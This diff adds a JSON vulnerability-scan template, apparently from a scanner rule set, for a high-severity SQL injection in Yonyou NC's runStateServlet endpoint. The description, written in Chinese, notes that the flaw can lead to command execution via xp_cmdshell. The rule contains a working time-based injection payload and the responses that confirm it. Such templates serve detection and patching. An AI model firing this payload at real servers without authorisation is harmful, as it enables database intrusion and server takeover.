@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友NC runStateServlet SQL注入漏洞复现",
+    "level": "高危",
+    "description": "用友NC /portal/pt/servlet/runStateServlet接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。",
+    "product": "用友NC",
+    "version": "NC version<=6.5",
+    "cve": "无",
+    "reference": "https://mp.weixin.qq.com/s/5YW7G1nYUZ4BCBn1MalQfg",
+    "fixing": "关闭互联网暴露面或接口设置访问权限\r\n升级至安全版本",
+    "rule": {
+        "path": "/portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:5'--",
+        "method": "GET",
+        "headers": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded",
+        "body": "",
+        "status_code": "500",
+        "keywords": "Error",
+        "res_time": "5"
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
